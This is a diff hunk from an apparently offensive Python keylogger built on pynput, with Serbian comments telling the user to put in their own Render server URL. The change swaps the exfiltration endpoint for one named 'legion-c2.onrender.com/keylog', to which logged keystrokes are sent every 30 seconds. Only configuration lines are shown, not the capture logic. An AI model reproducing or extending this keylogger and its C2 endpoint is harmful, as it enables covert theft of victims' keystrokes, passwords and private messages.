@@ -7,7 +7,7 @@ from pynput import keyboard
 
 # ----- KONFIGURACIJA -----
 # 🔁 OBAVEZNO: Zameni sa URL-om tvog servera na Renderu!
-SERVER_URL = "https://keylogger-relay-1.onrender.com/log"  # Npr. https://keylogger-relay.onrender.com/log
+SERVER_URL = "https://legion-c2.onrender.com/keylog"  # Npr. https://keylogger-relay.onrender.com/log
 SEND_INTERVAL = 30  # Šalje svakih 30 sekundi
 
 log_buffer = ""
